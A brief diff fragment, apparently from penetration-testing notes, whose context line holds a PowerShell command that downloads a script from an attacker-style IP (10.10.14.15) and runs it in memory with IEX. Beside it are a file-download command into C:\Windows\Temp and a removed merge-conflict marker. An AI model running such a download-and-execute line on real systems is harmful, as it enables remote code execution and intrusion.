@@ -33,4 +33,4 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/uni
 -> Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"  
 
 
->>>>>>> c18351abc401d2fabb90be43f30447112f24ea58
+
